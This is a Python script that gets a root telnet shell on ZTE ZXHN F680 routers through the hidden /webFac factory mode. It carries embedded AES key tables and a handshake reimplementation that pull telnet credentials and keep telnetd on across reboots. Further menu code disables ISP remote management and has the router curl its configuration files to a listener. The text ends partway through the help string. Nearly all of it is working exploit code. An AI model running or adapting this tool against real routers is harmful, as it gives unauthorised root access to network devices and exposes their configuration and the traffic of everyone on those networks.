#!/usr/bin/env python3
"""Enable telnetd and retrieve telnet credentials on a ZTE ZXHN F680 via /webFac.

    python f680-root.py
    python f680-root.py --user admin --pass pw
    python f680-root.py --ip 192.168.1.1 --port 80
    python f680-root.py --check
    python f680-root.py --shell

Credentials rotate on each run. Telnetd stays enabled across reboots.
"""

import argparse
import contextlib
import http.client
import http.server
import os
import random
import re
import select
import socket
import sys
import threading
import time
import urllib.parse

# AES

def _xtime(a: int) -> int:
    return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1) & 0xFF


def _gmul(a: int, b: int) -> int:
    r = 0
    while b:
        if b & 1:
            r ^= a
        a = _xtime(a)
        b >>= 1
    return r & 0xFF


def _build_sbox() -> list[int]:
    sbox = [0] * 256
    p = q = 1
    while True:
        p = (p ^ ((p << 1) & 0xFF) ^ (0x1B if p & 0x80 else 0)) & 0xFF
        q ^= (q << 1) & 0xFF
        q ^= (q << 2) & 0xFF
        q ^= (q << 4) & 0xFF
        q &= 0xFF
        if q & 0x80:
            q ^= 0x09
        q &= 0xFF
        x = q
        for shift in (1, 2, 3, 4):
            x ^= ((q << shift) | (q >> (8 - shift))) & 0xFF
        sbox[p] = (x ^ 0x63) & 0xFF
        if p == 1:
            break
    sbox[0] = 0x63
    return sbox


_SBOX = _build_sbox()
_INV_SBOX = [0] * 256
for _i, _v in enumerate(_SBOX):
    _INV_SBOX[_v] = _i

_RCON = (0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36)


def _expand_key(key: bytes) -> tuple[list[list[int]], int]:
    nk = len(key) // 4
    nr = nk + 6
    w = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    for i in range(nk, 4 * (nr + 1)):
        t = list(w[i - 1])
        if i % nk == 0:
            t = t[1:] + t[:1]
            t = [_SBOX[b] for b in t]
            t[0] ^= _RCON[i // nk - 1]
        elif nk > 6 and i % nk == 4:
            t = [_SBOX[b] for b in t]
        w.append([w[i - nk][j] ^ t[j] for j in range(4)])
    return w, nr


def _add_round_key(s: list[int], w: list[list[int]], rnd: int) -> None:
    for c in range(4):
        for r in range(4):
            s[4 * c + r] ^= w[rnd * 4 + c][r]


def _shift_rows(s: list[int]) -> list[int]:
    return [s[4 * ((c + r) % 4) + r] for c in range(4) for r in range(4)]


def _inv_shift_rows(s: list[int]) -> list[int]:
    return [s[4 * ((c - r) % 4) + r] for c in range(4) for r in range(4)]


def _mix_columns(s: list[int]) -> list[int]:
    out = [0] * 16
    for c in range(4):
        a, b, cc, d = s[4 * c:4 * c + 4]
        out[4 * c + 0] = _gmul(a, 2) ^ _gmul(b, 3) ^ cc ^ d
        out[4 * c + 1] = a ^ _gmul(b, 2) ^ _gmul(cc, 3) ^ d
        out[4 * c + 2] = a ^ b ^ _gmul(cc, 2) ^ _gmul(d, 3)
        out[4 * c + 3] = _gmul(a, 3) ^ b ^ cc ^ _gmul(d, 2)
    return out


def _inv_mix_columns(s: list[int]) -> list[int]:
    out = [0] * 16
    for c in range(4):
        a, b, cc, d = s[4 * c:4 * c + 4]
        out[4 * c + 0] = _gmul(a, 14) ^ _gmul(b, 11) ^ _gmul(cc, 13) ^ _gmul(d, 9)
        out[4 * c + 1] = _gmul(a, 9) ^ _gmul(b, 14) ^ _gmul(cc, 11) ^ _gmul(d, 13)
        out[4 * c + 2] = _gmul(a, 13) ^ _gmul(b, 9) ^ _gmul(cc, 14) ^ _gmul(d, 11)
        out[4 * c + 3] = _gmul(a, 11) ^ _gmul(b, 13) ^ _gmul(cc, 9) ^ _gmul(d, 14)
    return out


def _encrypt_block(key: bytes, block: bytes) -> bytes:
    w, nr = _expand_key(key)
    s = list(block)
    _add_round_key(s, w, 0)
    for rnd in range(1, nr):
        s = [_SBOX[b] for b in s]
        s = _shift_rows(s)
        s = _mix_columns(s)
        _add_round_key(s, w, rnd)
    s = [_SBOX[b] for b in s]
    s = _shift_rows(s)
    _add_round_key(s, w, nr)
    return bytes(s)


def _decrypt_block(key: bytes, block: bytes) -> bytes:
    w, nr = _expand_key(key)
    s = list(block)
    _add_round_key(s, w, nr)
    for rnd in range(nr - 1, 0, -1):
        s = _inv_shift_rows(s)
        s = [_INV_SBOX[b] for b in s]
        _add_round_key(s, w, rnd)
        s = _inv_mix_columns(s)
    s = _inv_shift_rows(s)
    s = [_INV_SBOX[b] for b in s]
    _add_round_key(s, w, 0)
    return bytes(s)


def _pad_zero(data: bytes) -> bytes:
    rem = len(data) % 16
    return data if not rem else data + b"\x00" * (16 - rem)


def aes_ecb_encrypt(key: bytes, data: bytes) -> bytes:
    data = _pad_zero(data)
    return b"".join(_encrypt_block(key, data[i:i + 16])
                    for i in range(0, len(data), 16))


def aes_ecb_decrypt(key: bytes, data: bytes) -> bytes:
    data = _pad_zero(data)
    return b"".join(_decrypt_block(key, data[i:i + 16])
                    for i in range(0, len(data), 16))


# Key tables

# Protocol prior art: douniwan5788/zte_modem_tools.

KEY_POOL_V1 = bytes((
    0x7B, 0x56, 0xB0, 0xF7, 0xDA, 0x0E, 0x68, 0x52, 0xC8, 0x19,
    0xF3, 0x2B, 0x84, 0x90, 0x79, 0xE5, 0x62, 0xF8, 0xEA, 0xD2,
    0x64, 0x93, 0x87, 0xDF, 0x73, 0xD7, 0xFB, 0xCC, 0xAA, 0xFE,
    0x75, 0x43, 0x1C, 0x29, 0xDF, 0x4C, 0x52, 0x2C, 0x6E, 0x7B,
    0x45, 0x3D, 0x1F, 0xF1, 0xDE, 0xBC, 0x27, 0x85, 0x8A, 0x45,
    0x91, 0xBE, 0x38, 0x13, 0xDE, 0x67, 0x32, 0x08, 0x54, 0x11,
    0x75, 0xF4, 0xD3, 0xB4, 0xA4, 0xB3, 0x12, 0x86, 0x67, 0x23,
    0x99, 0x4C, 0x61, 0x7F, 0xB1, 0xD2, 0x30, 0xDF, 0x47, 0xF1,
    0x76, 0x93, 0xA3, 0x8C, 0x95, 0xD3, 0x59, 0xBF, 0x87, 0x8E,
    0xF3, 0xB3, 0xE4, 0x76, 0x49, 0x88,
))

KEY_POOL_V2 = bytes((
    0x8C, 0x23, 0x65, 0xD1, 0xFC, 0x32, 0x45, 0x37, 0x11, 0x28,
    0x71, 0x63, 0x07, 0x20, 0x69, 0x14, 0x73, 0xE7, 0xD4, 0x53,
    0x13, 0x24, 0x36, 0xC2, 0xB5, 0xE1, 0xFC, 0xCF, 0x8A, 0x9A,
    0x41, 0x89, 0x3C, 0x49, 0xCF, 0x5C, 0x72, 0x8C, 0x9E, 0xEB,
    0x75, 0x0D, 0x3F, 0xD1, 0xFE, 0xCC, 0x57, 0x65, 0x7A, 0x35,
    0x21, 0x3E, 0x68, 0x53, 0x7E, 0x97, 0x02, 0x48, 0x74, 0x71,
    0x95, 0x34, 0x53, 0x84, 0xB4, 0xC3, 0xE2, 0xD6, 0x27, 0x3D,
    0xE6, 0x5D, 0x72, 0x9C, 0xBC, 0x3D, 0x03, 0xFD, 0x76, 0xC1,
    0x9C, 0x25, 0xA8, 0x92, 0x47, 0xE4, 0x18, 0x0F, 0x24, 0x3F,
    0x4F, 0x67, 0xEC, 0x97, 0xF4, 0x99,
))

KEY_XOR = 0xA5
KEY_LEN = 24


# Device client

class Device:
    def __init__(self, ip: str, port: int, timeout: float = 20.0, verbose: bool = True):
        self.ip, self.port, self.timeout = ip, port, timeout
        self.verbose = verbose
        self.key: bytes | None = None

    def post(self, path: str, body: bytes, *, retry: bool = True) -> tuple[int, bytes]:
        """POST raw bytes and return (status, body)."""
        last: Exception | None = None
        for attempt in range(2):
            # The CGI replies Connection: close to every request, requiring a
            # fresh HTTPConnection. A keep-alive header makes it drop the socket
            # without answering.
            conn = http.client.HTTPConnection(self.ip, self.port, timeout=self.timeout)
            try:
                conn.request("POST", "/" + path, body=body,
                             headers={"Content-Type": "application/octet-stream",
                                      "User-Agent": "Mozilla/5.0"})
                resp = conn.getresponse()
                return resp.status, resp.read()
            except (ConnectionResetError, http.client.RemoteDisconnected,
                    http.client.BadStatusLine, BrokenPipeError) as exc:
                last = exc
                if not retry or attempt:
                    raise
            finally:
                with contextlib.suppress(OSError):
                    conn.close()
        raise last if last else RuntimeError("unreachable")

    def say(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def enc(self, text: str) -> bytes:
        if self.key is None:
            raise RuntimeError("no AES key yet - run the handshake first")
        return aes_ecb_encrypt(self.key, text.encode())

    def dec(self, blob: bytes) -> str:
        assert self.key is not None
        return aes_ecb_decrypt(self.key, blob).rstrip(b"\x00").decode("utf-8", "replace")

    def pick_key(self, rand: int, pool: bytes, index: int) -> None:
        # The random handshake value selects a 24-byte static-table slice,
        # XOR 0xA5; the 24-byte key makes this AES-192.
        raw = pool[index:index + KEY_LEN]
        self.key = bytes(b ^ KEY_XOR for b in raw)

    def reset(self) -> None:
        status, body = self.post("webFac", b"SendSq.gch")
        self.say(f"[1] reset           -> {status} {body[:48]!r}")
        if status != 400:
            self.say("    (expected HTTP 400; carrying on anyway)")

    def request_factory_mode(self) -> None:
        # /webFac drops the TCP connection for RequestFactoryMode.gch;
        # this signals success, not an error.
        try:
            status, _ = self.post("webFac", b"RequestFactoryMode.gch", retry=False)
        except (ConnectionResetError, http.client.RemoteDisconnected,
                http.client.BadStatusLine, TimeoutError):
            self.say("[2] RequestFactoryMode -> socket dropped (expected)")
            return
        self.say(f"[2] RequestFactoryMode -> {status}")

    def handshake(self, rand: int) -> bool:
        status, body = self.post("webFac", f"SendSq.gch?rand={rand}\r\n".encode())
        self.say(f"[3] SendSq rand={rand}   -> {status} {body[:64]!r}")
        if status != 200:
            return False

        # An empty body selects v1, where the key-table index equals rand.
        if not body:
            self.pick_key(rand, KEY_POOL_V1, rand)
            self.say("    protocol v1")
            return True

        # A newrand=N body selects v2:
        # index = ((0x1000193 * rand) & 0x3F ^ newrand) % 60.
        text = body.decode("ascii", "replace").strip()
        if not text.startswith("newrand="):
            self.say(f"    unknown handshake payload {body[:40]!r}")
            return False
        newrand = int(text[len("newrand="):])
        index = (((0x1000193 * rand) & 0x3F) ^ newrand) % 60
        self.pick_key(rand, KEY_POOL_V2, index)
        self.say(f"    protocol v2, key slot {index}")

        # V2 also requires SendInfo.gch before CheckLoginAuth.
        status, body = self.post("webFacEntry", self.enc("SendInfo.gch?info=6|"))
        self.say(f"[4] SendInfo          -> {status}")
        return True

    def check_login(self, user: str, password: str) -> str | None:
        payload = self.enc(f"CheckLoginAuth.gch?version50&user={user}&pass={password}")
        status, body = self.post("webFacEntry", payload)
        self.say(f"[5] CheckLoginAuth    -> {status}")
        if status != 200:
            return None
        try:
            text = self.dec(body)
        except Exception:
            return None
        self.say(f"    {text[:120]}")
        return text

    def enter_mode2(self) -> str | None:
        payload = self.enc("FactoryMode.gch?mode=2&user=notused")
        status, body = self.post("webFacEntry", payload)
        self.say(f"[6] FactoryMode mode=2 -> {status}")
        if status != 200:
            return None
        try:
            return self.dec(body)
        except Exception:
            return None


def parse_telnet_auth(reply: str) -> tuple[str, str] | None:
    """Pull user/pass out of '...FactoryModeAuth.gch?user=..&pass=..'."""
    marker = "FactoryModeAuth.gch"
    pos = reply.find(marker)
    if pos < 0:
        return None
    tail = reply[pos + len(marker):]
    tail = tail.lstrip("?")
    query = tail.split()[0] if tail.split() else tail
    params = urllib.parse.parse_qs(query, keep_blank_values=True)
    user = params.get("user", [""])[0]
    password = params.get("pass", [""])[0]
    if not user or not password:
        return None
    return user, password


# Telnet client

def probe_telnet(ip: str, port: int = 23, timeout: float = 5.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout):
            return True
    except OSError:
        return False


def shell(ip: str, user: str, password: str, port: int = 23) -> int:
    """Log in and run an interactive telnet shell."""
    import select

    IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240

    def clean(data: bytes, sock: socket.socket) -> bytes:
        out, i, reply = bytearray(), 0, bytearray()
        while i < len(data):
            if data[i] != IAC:
                out.append(data[i])
                i += 1
                continue
            if i + 1 >= len(data):
                break
            cmd = data[i + 1]
            if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(data):
                opt = data[i + 2]
                reply += bytes([IAC, WONT if cmd in (DO, DONT) else DONT, opt])
                i += 3
            elif cmd == SB:
                j = data.find(bytes([IAC, SE]), i)
                i = len(data) if j < 0 else j + 2
            else:
                i += 2
        if reply:
            sock.sendall(bytes(reply))
        return bytes(out)

    def pump(sock: socket.socket, wait: float) -> str:
        buf, deadline = [], time.time() + wait
        while time.time() < deadline:
            ready, _, _ = select.select([sock], [], [], 0.3)
            if not ready:
                continue
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf.append(clean(chunk, sock))
            deadline = time.time() + 0.6
        return b"".join(buf).decode("utf-8", "replace").replace("\r", "")

    with socket.create_connection((ip, port), 10) as sock:
        sock.settimeout(10)
        pump(sock, 1.5)
        sock.sendall(user.encode() + b"\r\n")
        pump(sock, 1.0)
        sock.sendall(password.encode() + b"\r\n")
        banner = pump(sock, 2.5)
        if "/ #" not in banner and "BusyBox" not in banner:
            print(banner.strip()[:300])
            print("\n[!] login rejected - credentials rotate, re-run f680-root.py")
            return 1
        print(banner.strip()[:300])
        print("\n[*] shell ready. 'exit' to leave.\n")
        while True:
            try:
                line = input("f680> ")
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if line.strip() in ("exit", "quit", "logout"):
                break
            sock.sendall(line.encode() + b"\r\n")
            print(pump(sock, 3.0), end="")
    return 0


# Read-only status report

RECOMMENDED = (
    ("DHCP4sPool", "LeaseTime", "86400", "leases expire instead of living forever"),
    ("Bridge", "ArpStolenEnable", "0", "router stops rewriting neighbours' ARP"),
    ("UPnPCfg", "EnableUPnPIGD", "0", "no UPnP port mapper to poke holes"),
    ("MgtServer", "PeriodicInformInterval", "604800", "TR-069 still on, just rarely"),
)


def human_time(seconds: float) -> str:
    m, s = divmod(int(seconds), 60)
    h, m = divmod(m, 60)
    d, h = divmod(h, 24)
    if d:
        return f"{d}d {h}h {m}m"
    if h:
        return f"{h}h {m}m"
    return f"{m}m {s}s"


def parse_table(text: str) -> list[dict[str, str]]:
    """Turn displayDB / sendcmd XML rows into a list of {field: value}."""
    rows = []
    for chunk in text.split('<Row No="')[1:]:
        body = chunk.split("</Row>")[0]
        row = {}
        for m in re.finditer(r'<DM name="([^"]+)" val="([^"]*)"', body):
            row[m.group(1)] = m.group(2)
        if row:
            rows.append(row)
    return rows


def _first(rows: list[dict[str, str]]) -> dict[str, str]:
    return rows[0] if rows else {}


class TelnetSession:
    """One login, many commands - a single slot out of TelnetCfg.Max_Con_Num."""

    IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240

    def __init__(self, ip: str, user: str, password: str, port: int = 23,
                 timeout: float = 20.0):
        self.ip, self.user, self.password, self.port = ip, user, password, port
        self.timeout = timeout
        self.sock: socket.socket | None = None
        self._seq = 0

    def __enter__(self) -> "TelnetSession":
        self.connect()
        return self

    def __exit__(self, *exc_info) -> None:
        self.close()

    def _clean(self, data: bytes) -> bytes:
        out, i, reply = bytearray(), 0, bytearray()
        while i < len(data):
            if data[i] != self.IAC:
                out.append(data[i])
                i += 1
                continue
            if i + 1 >= len(data):
                break
            cmd = data[i + 1]
            if cmd in (self.DO, self.DONT, self.WILL, self.WONT) and i + 2 < len(data):
                opt = data[i + 2]
                answer = self.WONT if cmd in (self.DO, self.DONT) else self.DONT
                reply += bytes([self.IAC, answer, opt])
                i += 3
            elif cmd == self.SB:
                j = data.find(bytes([self.IAC, self.SE]), i)
                i = len(data) if j < 0 else j + 2
            else:
                i += 2
        if reply and self.sock:
            self.sock.sendall(bytes(reply))
        return bytes(out)

    def _pump(self, wait: float) -> str:
        sock = self.sock
        if sock is None:
            raise RuntimeError("not connected")
        buf, deadline = [], time.time() + wait
        while time.time() < deadline:
            ready, _, _ = select.select([sock], [], [], 0.25)
            if not ready:
                continue
            chunk = sock.recv(65536)
            if not chunk:
                break
            buf.append(self._clean(chunk))
            deadline = time.time() + 0.5
        return b"".join(buf).decode("utf-8", "replace").replace("\r", "")

    def connect(self) -> None:
        self.sock = socket.create_connection((self.ip, self.port), self.timeout)
        self.sock.settimeout(self.timeout)
        self._pump(1.2)
        self.sock.sendall(self.user.encode() + b"\r\n")
        self._pump(0.8)
        self.sock.sendall(self.password.encode() + b"\r\n")
        banner = self._pump(2.0)
        if "BusyBox" not in banner and "/ #" not in banner:
            raise RuntimeError("telnet login rejected - credentials rotate, re-run this script")

    def run(self, command: str, timeout: float | None = None) -> str:
        """Run one command and return its output without echo and prompt.

        The markers are written as @@'Sa1'@@ so that the echoed command line
        does not contain the literal marker - only the shell's output does.
        """
        sock = self.sock
        if sock is None:
            raise RuntimeError("not connected")
        self._seq += 1
        seq = self._seq
        start, stop = f"@@Sa{seq}@@", f"@@Sb{seq}@@"
        line = (f"printf '\\n'; echo @@'Sa{seq}'@@; {command}; echo @@'Sb{seq}'@@\r\n")
        sock.sendall(line.encode())
        buf, deadline = b"", time.time() + (timeout or self.timeout)
        while time.time() < deadline:
            ready, _, _ = select.select([sock], [], [], 0.25)
            if not ready:
                continue
            chunk = sock.recv(65536)
            if not chunk:
                break
            buf += self._clean(chunk)
            if stop.encode() in buf:
                break
        text = buf.decode("utf-8", "replace").replace("\r", "")
        body = text.split(start, 1)[-1].split(stop, 1)[0]
        return body.strip("\n")

    def close(self) -> None:
        if self.sock is None:
            return
        with contextlib.suppress(OSError):
            self.sock.sendall(b"exit\r\n")
        with contextlib.suppress(OSError):
            self.sock.close()
        self.sock = None


def collect_status(sess: TelnetSession) -> dict:
    def run(cmd: str, timeout: float | None = None) -> str:
        try:
            return sess.run(cmd, timeout)
        except OSError:
            return ""

    st: dict = {}
    head = run("cat /proc/uptime").split()
    st["uptime"] = float(head[0]) if head else 0.0

    cpu = []
    for line in run("cat /proc/cpuusage").splitlines():
        m = re.search(r"Usage:\s*([\d.]+)%", line)
        if m:
            cpu.append(float(m.group(1)))
    st["cpu"] = cpu
    st["load"] = run("cat /proc/loadavg").strip()

    mem: dict[str, int] = {}
    for line in run("free").splitlines():
        if line.lower().startswith("mem:"):
            parts = line.split()
            if len(parts) >= 4:
                mem = {"total": int(parts[1]), "used": int(parts[2]), "free": int(parts[3])}
    st["mem"] = mem

    st["dev"] = _first(parse_table(run("displayDB DevInfo")))

    wan: dict[str, str] = {}
    for line in run("ifconfig nbif0").splitlines():
        m = re.search(r"inet addr:(\S+)\s+Bcast:(\S+)\s+Mask:(\S+)", line)
        if m:
            wan["ip"], wan["mask"] = m.group(1), m.group(3)
        m = re.search(r"HWaddr\s+(\S+)", line)
        if m:
            wan["mac"] = m.group(1)
        m = re.search(r"RX packets:(\d+)\s+errors:(\d+)\s+dropped:(\d+)", line)
        if m:
            wan["rx"], wan["rx_err"], wan["rx_drop"] = m.group(1), m.group(2), m.group(3)
        m = re.search(r"TX packets:(\d+)\s+errors:(\d+)\s+dropped:(\d+)", line)
        if m:
            wan["tx"], wan["tx_err"], wan["tx_drop"] = m.group(1), m.group(2), m.group(3)
    for line in run("route -n").splitlines():
        m = re.match(r"^0\.0\.0\.0\s+(\S+)", line)
        if m:
            wan["gw"] = m.group(1)
            break
    st["wan"] = wan

    ct_count = run("cat /proc/sys/net/netfilter/nf_conntrack_count").strip()
    ct_max = run("cat /proc/sys/net/netfilter/nf_conntrack_max").strip()
    st["conntrack"] = (ct_count, ct_max)

    st["telnet"] = _first(parse_table(run("displayDB TelnetCfg")))
    st["mgt"] = _first(parse_table(run("displayDB MgtServer")))
    st["watchdog"] = " ".join(run("cat /proc/watchdog/ctrl").split())

    st["hosts"] = parse_table(run("displayDB DHCPSHostInfo"))

    arp = {}
    for line in run("cat /proc/net/arp").splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
            arp.setdefault(parts[0], set()).add(parts[3].lower())
    st["arp"] = arp

    ports: dict[str, int] = {}
    for line in run("brctl showmacs br0").splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 2 and parts[1].isdigit():
            ports[parts[1]] = ports.get(parts[1], 0) + 1
    st["ports"] = ports
    return st


def _line(label: str, value: str) -> str:
    return f"  {label:<15} {value}" if value else ""


def render_status(st: dict) -> str:
    out: list[str] = ["F680 status"]
    dev = st.get("dev", {})
    out.append(_line("model", dev.get("ModelName") or dev.get("ProductClass") or "?"))
    out.append(_line("firmware", f"{dev.get('SoftwareVer', '?')}  ({dev.get('VerDate', '?')})"))
    out.append(_line("serial", dev.get("SerialNumber") or "(masked by firmware)"))
    out.append(_line("uptime", human_time(st.get("uptime", 0.0))))

    out.append("")
    out.append("CPU / memory")
    cpu = st.get("cpu") or []
    out.append(_line("cpu", "  ".join(f"{c:.1f}%" for c in cpu) or "?"))
    out.append(_line("load", st.get("load", "?")))
    mem = st.get("mem") or {}
    if mem:
        pct = 100.0 * mem["used"] / mem["total"] if mem["total"] else 0.0
        out.append(_line("memory", f"{mem['free']} of {mem['total']} kB free ({pct:.0f}% used)"))

    out.append("")
    out.append("WAN")
    wan = st.get("wan") or {}
    if wan.get("ip"):
        out.append(_line("address", f"{wan['ip']}  mask {wan.get('mask', '?')}"))
    if wan.get("gw"):
        out.append(_line("gateway", wan["gw"]))
    if wan.get("mac"):
        out.append(_line("mac", wan["mac"]))
    if wan.get("rx"):
        out.append(_line("rx / tx", f"{wan['rx']} / {wan.get('tx', '?')} packets"))
    if wan.get("rx_err"):
        out.append(_line("errors", f"rx {wan['rx_err']} drop {wan.get('rx_drop', '?')} / "
                                    f"tx {wan.get('tx_err', '?')} drop {wan.get('tx_drop', '?')}"))

    count, limit = st.get("conntrack", ("?", "?"))
    out.append("")
    out.append("Conntrack")
    if count.isdigit() and limit.isdigit() and int(limit):
        out.append(_line("entries", f"{count} / {limit} ({100 * int(count) // int(limit)}%)"))
    else:
        out.append(_line("entries", f"{count} / {limit}"))

    mgt = st.get("mgt", {})
    out.append("")
    out.append("Remote management (TR-069)")
    out.append(_line("acs", mgt.get("URL", "?")))
    enabled = mgt.get("Tr069Enable", "?") == "1"
    interval = mgt.get("PeriodicInformInterval", "?")
    periodic = mgt.get("PeriodicInformEnable", "?") == "1"
    out.append(_line("enabled", f"{'yes' if enabled else 'no'}, periodic inform "
                               f"{'every ' + interval + ' s' if periodic else 'off'}"))
    out.append(_line("upgrades", f"managed by ACS: {mgt.get('UpgradesManaged', '?')}"))

    tel = st.get("telnet", {})
    out.append("")
    out.append("Telnet")
    out.append(_line("enabled", f"{'yes' if tel.get('TS_Enable') == '1' else 'no'}, "
                               f"port {tel.get('TS_Port', '?')}, "
                               f"max {tel.get('Max_Con_Num', '?')} sessions"))
    if st.get("watchdog"):
        out.append(_line("watchdog", st["watchdog"]))

    hosts = st.get("hosts") or []
    out.append("")
    out.append(f"LAN leases ({len(hosts)})")
    for row in hosts:
        out.append(f"  {row.get('IpAddr', '?'):<15} {row.get('MacAddr', '?'):<18} "
                   f"{row.get('HostName', '')}")

    conflicts: list[str] = []
    by_ip: dict[str, set[str]] = {}
    for row in hosts:
        ip = row.get("IpAddr")
        mac = (row.get("MacAddr") or "").lower()
        if ip and mac:
            by_ip.setdefault(ip, set()).add(mac)
    for ip, macs in by_ip.items():
        if len(macs) > 1:
            conflicts.append(f"{ip} is leased to {', '.join(sorted(macs))}")
    arp = st.get("arp") or {}
    for ip, macs in by_ip.items():
        live = arp.get(ip, set())
        if live and len(live) > 1:
            conflicts.append(f"{ip} answers ARP from {', '.join(sorted(live))}")
        elif live and macs and not (live & macs):
            conflicts.append(f"{ip} is leased to {sorted(macs)[0]} but answers as {sorted(live)[0]}")
    if conflicts:
        out.append("")
        out.append("Address conflicts")
        for item in conflicts:
            out.append(f"  [!] {item}")

    ports = st.get("ports") or {}
    if ports:
        out.append("")
        out.append("Bridge ports (learned MACs)")
        out.append("  " + "  ".join(f"port {p}: {n}" for p, n in sorted(ports.items(), key=lambda kv: int(kv[0]))))

    return "\n".join(line for line in out if line is not None)


def dump_config(sess: TelnetSession, outdir: str, host: str | None = None) -> list[str]:
    """Pull the router's log and config to a local directory over HTTP."""
    os.makedirs(outdir, exist_ok=True)
    saved: list[str] = []

    listing = sess.run("ls -l /userconfig/cfg")
    with open(os.path.join(outdir, "cfg-listing.txt"), "w", encoding="utf-8") as fh:
        fh.write(listing + "\n")
    saved.append("cfg-listing.txt")

    if host is None:
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            probe.connect((sess.ip, 80))
            host = probe.getsockname()[0]
        finally:
            probe.close()

    received: list[str] = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_POST(self) -> None:  # noqa: N802 - stdlib naming
            length = int(self.headers.get("Content-Length") or 0)
            data = self.rfile.read(length) if length else b""
            name = os.path.basename(self.path.lstrip("/")) or "upload.bin"
            with open(os.path.join(outdir, name), "wb") as fh:
                fh.write(data)
            received.append(name)
            self.send_response(200)
            self.end_headers()

        def log_message(self, format: str, *args) -> None:  # noqa: A002 - stdlib naming
            pass

    bind = host or ""
    server = http.server.HTTPServer((bind, 0), Handler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        for name in ("log", "db_user_cfg.xml"):
            sess.run(f"curl -s --max-time 30 --data-binary @/userconfig/cfg/{name} "
                     f"http://{host}:{port}/{name}", timeout=45)
            time.sleep(0.5)
        tables = ["DevInfo", "TelnetCfg", "MgtServer", "DHCP4sPool", "DHCPSHostInfo",
                  "Bridge", "UPnPCfg", "LanDevDHCPSource"]
        with open(os.path.join(outdir, "tables.txt"), "w", encoding="utf-8") as fh:
            for table in tables:
                fh.write(f"### {table}\n{sess.run('displayDB ' + table)}\n\n")
        saved.append("tables.txt")
    finally:
        server.shutdown()
        server.server_close()

    for name in received:
        size = os.path.getsize(os.path.join(outdir, name))
        saved.append(f"{name} ({size} bytes)")
    return saved


# Interactive menu for changes that touch the provider link

MENU = """
 1) show status
 2) show TR-069 settings
 3) detach from the provider: turn ACS / TR-069 off
 4) re-attach: TR-069 on, inform every 12 h
 5) apply the stability tuning
 6) roll the stability tuning back
 7) enable or disable telnet
 8) download log and config
 0) exit
"""


def db_set(sess: TelnetSession, table: str, field: str, value: str, dry: bool) -> str:
    cmd = f"sendcmd 1 DB set {table} 0 {field} {value}"
    if not dry:
        sess.run(cmd)
    return cmd


def db_save(sess: TelnetSession, dry: bool) -> str:
    if not dry:
        sess.run("sendcmd 1 DB save")
    return "sendcmd 1 DB save"


def confirm(question: str) -> bool:
    try:
        return input(f"{question} [yes/no]: ").strip().lower() in ("yes", "y")
    except (EOFError, KeyboardInterrupt):
        print()
        return False


def menu(sess: TelnetSession, args) -> int:
    dry = args.dry_run
    if dry:
        print("[i] dry run: commands are printed, nothing is written\n")
    while True:
        print(MENU)
        try:
            choice = input("choice> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0

        if choice in ("0", "q", "exit"):
            return 0

        if choice == "1":
            print()
            print(render_status(collect_status(sess)))
            print()

        elif choice == "2":
            rows = parse_table(sess.run("displayDB MgtServer"))
            print()
            for key in ("URL", "UserName", "Tr069Enable", "PeriodicInformEnable",
                        "PeriodicInformInterval", "UpgradesManaged", "DefaultWan"):
                print(f"  {key:<24} {(rows[0].get(key) if rows else '?')}")
            print()

        elif choice == "3":
            if not confirm("Turn TR-069 off? The ISP loses remote access until you undo it"):
                continue
            for cmd in (db_set(sess, "MgtServer", "Tr069Enable", "0", dry),
                        db_set(sess, "MgtServer", "PeriodicInformEnable", "0", dry),
                        db_save(sess, dry)):
                print(f"  {cmd}")
            print("  done - undo with option 4\n")

        elif choice == "4":
            if not confirm("Turn TR-069 back on with a 12 h inform interval"):
                continue
            for cmd in (db_set(sess, "MgtServer", "Tr069Enable", "1", dry),
                        db_set(sess, "MgtServer", "PeriodicInformEnable", "1", dry),
                        db_set(sess, "MgtServer", "PeriodicInformInterval", "43200", dry),
                        db_save(sess, dry)):
                print(f"  {cmd}")
            print()

        elif choice == "5":
            if not confirm("Apply the four stability settings"):
                continue
            for table, field, value, _why in RECOMMENDED:
                print(f"  {db_set(sess, table, field, value, dry)}")
            print(f"  {db_save(sess, dry)}")
            print()

        elif choice == "6":
            if not confirm("Restore the firmware defaults for those four settings"):
                continue
            for table, field, value, _why in (("DHCP4sPool", "LeaseTime", "-1", ""),
                                              ("Bridge", "ArpStolenEnable", "1", ""),
                                              ("UPnPCfg", "EnableUPnPIGD", "1", ""),
                                              ("MgtServer", "PeriodicInformInterval", "42344", "")):
                print(f"  {db_set(sess, table, field, value, dry)}")
            print(f"  {db_save(sess, dry)}")
            print()

        elif choice == "7":
            current = _first(parse_table(sess.run("displayDB TelnetCfg"))).get("TS_Enable", "?")
            want = "0" if current == "1" else "1"
            print(f"\n  telnet is currently {'on' if current == '1' else 'off'}")
            if not confirm(f"Turn telnet {'off' if want == '0' else 'on'}"):
                continue
            print(f"  {db_set(sess, 'TelnetCfg', 'TS_Enable', want, dry)}")
            print(f"  {db_save(sess, dry)}")
            if want == "0" and not dry:
                print("  note: the shell stays usable until this session ends")
            print()

        elif choice == "8":
            outdir = args.config or "f680-dump"
            for name in dump_config(sess, outdir, args.host):
                print(f"  saved {name}")
            print(f"  into {os.path.abspath(outdir)}\n")

        else:
            print("  unknown choice\n")


# CLI

HELP_BODY = """\
f680-root.py - root shell on a ZTE ZXHN F680 (MGTS V9.1.10P1N9)
            via the hidden /webFac factory mode

usage: f680-root.py [mode] [options]

modes (pick one; none prints this help):
  -shell          open an interactive console
  -status         read-only health report over telnet
  -exec "CMD"     run one command on the router, print its output
  -creds          print the telnet user and password only
  -check          probe /webFac and exit, change nothing
